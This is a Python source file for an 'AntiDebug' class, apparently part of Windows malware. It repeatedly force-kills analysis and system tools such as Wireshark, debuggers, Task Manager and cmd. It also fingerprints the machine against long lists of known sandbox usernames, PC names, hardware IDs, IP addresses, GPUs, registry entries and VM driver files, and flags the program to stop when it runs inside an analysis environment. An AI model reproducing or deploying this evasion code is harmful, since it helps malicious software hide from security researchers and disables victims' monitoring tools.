import os
import sys
import time
import httpx
import winreg
import psutil
import threading
import subprocess

class AntiDebug:
    inVM = False
    def __init__(self):
        self.running = True
        self.processes = list()

        self.blackListedPrograms = ["httpdebuggerui.exe","wireshark.exe","fiddler.exe","regedit.exe","cmd.exe","taskmgr.exe","vboxservice.exe","df5serv.exe","processhacker.exe","vboxtray.exe","vmtoolsd.exe","vmwaretray.exe","ida64.exe","ollydbg.exe","pestudio.exe","vmwareuser","vgauthservice.exe","vmacthlp.exe","x96dbg.exe","vmsrvc.exe","x32dbg.exe","vmusrvc.exe","prl_cc.exe","prl_tools.exe","xenservice.exe","qemu-ga.exe","joeboxcontrol.exe","ksdumperclient.exe","ksdumper.exe","joeboxserver.exe"]
        self.blackListedUsers = ["WDAGUtilityAccount","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl",]
        self.blackListedPCNames = ["BEE7370C-8C0C-4","DESKTOP-NAKFFMT","WIN-5E07COS9ALR","B30F0242-1C6A-4","DESKTOP-VRSQLAG","Q9IATRKPRH","XC64ZB","DESKTOP-D019GDM","DESKTOP-WI8CLET","SERVER1","LISA-PC","JOHN-PC","DESKTOP-B0T93D6","DESKTOP-1PYKP29","DESKTOP-1Y2433R","WILEYPC","WORK","6C4E733F-C2D9-4","RALPHS-PC","DESKTOP-WG3MYJS","DESKTOP-7XC6GEZ","DESKTOP-5OV9S0O","QarZhrdBpj","ORELEEPC","ARCHIBALDPC","JULIA-PC","d1bnJkfVlH",]
        self.blackListedHWIDS = ["7AB5C494-39F5-4941-9163-47F54D6D5016","032E02B4-0499-05C3-0806-3C0700080009","03DE0294-0480-05DE-1A06-350700080009","11111111-2222-3333-4444-555555555555","6F3CA5EC-BEC9-4A4D-8274-11168F640058","ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548","4C4C4544-0050-3710-8058-CAC04F59344A","00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-000000000000","5BD24D56-789F-8468-7CDC-CAA7222CC121","49434D53-0200-9065-2500-65902500E439","49434D53-0200-9036-2500-36902500F022","777D84B3-88D1-451C-93E4-D235177420A7","49434D53-0200-9036-2500-369025000C65","B1112042-52E8-E25B-3655-6A4F54155DBF","00000000-0000-0000-0000-AC1F6BD048FE","EB16924B-FB6D-4FA1-8666-17B91F62FB37","A15A930C-8251-9645-AF63-E45AD728C20C","67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3","C7D23342-A5D4-68A1-59AC-CF40F735B363","63203342-0EB0-AA1A-4DF5-3FB37DBB0670","44B94D56-65AB-DC02-86A0-98143A7423BF","6608003F-ECE4-494E-B07E-1C4615D1D93C","D9142042-8F51-5EFF-D5F8-EE9AE3D1602A","49434D53-0200-9036-2500-369025003AF0","8B4E8278-525C-7343-B825-280AEBCD3BCB","4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27","79AF5279-16CF-4094-9758-F88A616D81B4",]
        self.blackListedIPS = ["88.132.231.71","78.139.8.50","20.99.160.173","88.153.199.169","84.147.62.12","194.154.78.160","92.211.109.160","195.74.76.222","188.105.91.116","34.105.183.68","92.211.55.199","79.104.209.33","95.25.204.90","34.145.89.174","109.74.154.90","109.145.173.169","34.141.146.114","212.119.227.151","195.239.51.59","192.40.57.234","64.124.12.162","34.142.74.220","188.105.91.173","109.74.154.91","34.105.72.241","109.74.154.92","213.33.142.50",]
        #
        # incase you want =>  self.blackListedMacAddresses = ["b4:2e:99:c3:08:3c","00:15:5d:00:07:34","00:e0:4c:b8:7a:58","00:0c:29:2c:c1:21","00:25:90:65:39:e4","c8:9f:1d:b6:58:e4","00:25:90:36:65:0c","00:15:5d:00:00:f3","2e:b8:24:4d:f7:de","00:15:5d:13:6d:0c","00:50:56:a0:dd:00","00:15:5d:13:66:ca","56:e8:92:2e:76:0d","ac:1f:6b:d0:48:fe","00:e0:4c:94:1f:20","00:15:5d:00:05:d5","00:e0:4c:4b:4a:40","42:01:0a:8a:00:22","00:1b:21:13:15:20","00:15:5d:00:06:43","00:15:5d:1e:01:c8","00:50:56:b3:38:68","60:02:92:3d:f1:69","00:e0:4c:7b:7b:86","00:e0:4c:46:cf:01","42:85:07:f4:83:d0","56:b0:6f:ca:0a:e7","12:1b:9e:3c:a6:2c","00:15:5d:00:1c:9a","00:15:5d:00:1a:b9","b6:ed:9d:27:f4:fa","00:15:5d:00:01:81","4e:79:c0:d9:af:c3","00:15:5d:b6:e0:cc","00:15:5d:00:02:26","00:50:56:b3:05:b4","1c:99:57:1c:ad:e4","08:00:27:3a:28:73","00:15:5d:00:00:c3","00:50:56:a0:45:03","12:8a:5c:2a:65:d1","00:25:90:36:f0:3b","00:1b:21:13:21:26","42:01:0a:8a:00:22","00:1b:21:13:32:51","a6:24:aa:ae:e6:12","08:00:27:45:13:10",]
        #
        self.blackListedGPU = ["Microsoft Remote Display Adapter","Microsoft Hyper-V Video","Microsoft Basic Display Adapter","VMware SVGA 3D","Standard VGA Graphics Adapter","NVIDIA GeForce 840M","NVIDIA GeForce 9400M","UKBEHH_S","ASPEED Graphics Family(WDDM)","H_EDEUEK","VirtualBox Graphics Adapter","K9SC88UK","Стандартный VGA графический адаптер",]

        threading.Thread(target=self.blockDebuggers).start()
        for t in [self.listCheck, self.inVirtualenv, self.registryCheck, self.specsCheck, self.dllCheck, self.procCheck]:
            x = threading.Thread(target=t)
            self.processes.append(x)
        for thread in self.processes:
            thread.start()
        for process in self.processes:
            process.join()

    def programExit(self):
        self.running = False
        self.__class__.inVM = True

    def programKill(self, proc):
        try:
            os.system(f"taskkill /F /T /IM {proc}")
        except Exception:
            pass

    def blockDebuggers(self) -> bool:
        while self.running:
            time.sleep(0.7)
            for proc in psutil.process_iter():
                for program in self.blackListedPrograms:
                    if proc.name().lower() == program:
                        self.programKill(program)

    def listCheck(self) -> bool:
        if os.path.exists(r'D:\Tools'):
            self.programExit()
        if os.path.exists(r'D:\OS2'):
            self.programExit()
        if os.path.exists(r'D:\NT3X'):
            self.programExit()

        myName = os.getlogin()
        for user in self.blackListedUsers:
            if myName == user:
                self.programExit()
        myPCName = os.getenv("COMPUTERNAME")
        for pcName in self.blackListedPCNames:
            if myPCName == pcName:
                self.programExit()
        myHWID = subprocess.check_output('wmic csproduct get uuid', stdin=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True).decode().split('\n')[1].strip()
        for hwid in self.blackListedHWIDS:
            if myHWID == hwid:
                self.programExit()
        try:
            myIP = httpx.get("https://api64.ipify.org/").text.strip()
        except (TimeoutError, httpx.ConnectError, httpx.ConnectTimeout):
            pass
        for ip in self.blackListedIPS:
            if myIP == ip:
                self.programExit()
        process = subprocess.Popen("wmic path win32_VideoController get name", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL, shell=True)
        myGPU = process.communicate()[0].decode().strip("Name\n").strip()
        for gpu in self.blackListedGPU:
            if myGPU == gpu:
                self.programExit()

    def inVirtualenv(self):
        if getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix != sys.prefix:
            self.programExit()

    def specsCheck(self) -> bool:
        ram = str(psutil.virtual_memory()[0]/1024/1024/1024).split(".")[0]
        if int(ram) <= 4:
            self.programExit()
        disk = str(psutil.disk_usage('/')[0]/1024/1024/1024).split(".")[0]
        if int(disk) <= 50:
            self.programExit()
        if int(psutil.cpu_count()) <= 1:
            self.programExit()

    def registryCheck(self) -> bool:
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")  
        if reg1 != 1 and reg2 != 1:    
            self.programExit()

        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
        try:
            reg_val = winreg.QueryValueEx(handle, '0')[0]

            if "VMware" in reg_val or "VBOX" in reg_val:
                self.programExit()
        finally:
            winreg.CloseKey(handle)

    def dllCheck(self) -> bool:
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")

        if os.path.exists(vmware_dll): 
            self.programExit()
        if os.path.exists(virtualbox_dll):
            self.programExit()

    def procCheck(self) -> bool:
        processes = ['VMwareService.exe', 'VMwareTray.exe']
        for proc in psutil.process_iter():
            for program in processes:
                if proc.name() == program:
                    self.programExit()